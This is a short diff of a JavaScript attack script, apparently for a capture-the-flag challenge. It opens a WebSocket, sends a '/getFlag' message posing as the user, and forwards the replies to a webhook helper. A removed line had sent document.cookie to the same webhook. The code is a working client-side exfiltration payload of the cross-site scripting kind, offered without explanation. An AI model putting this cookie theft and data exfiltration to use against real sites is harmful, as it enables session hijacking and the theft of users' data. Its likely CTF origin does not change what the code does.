@@ -10,7 +10,6 @@ function webhook(domain = "", data = null) {
 console.log("/init");
 
 let socket;
-let i = 0;
 
 // Initialize WebSocket connection
 function initWebSocket() {
@@ -23,13 +22,8 @@ function initWebSocket() {
   socket.onmessage = (event) => {
     // const messageData = JSON.parse(event.data);
     console.log("/onmessage", event.data);
-    webhook("/cookies", document.cookie);
-    if (i == 0) {
-      sendMessage({ sender: "user", message: "/getFlag" });
-    } else if (i == 1) {
-      webhook("/onmessage", event.data);
-    }
-    i++;
+    webhook("/onmessage", event.data);
+    sendMessage({ sender: "user", message: "/getFlag" });
   };
 
   socket.onclose = () => {
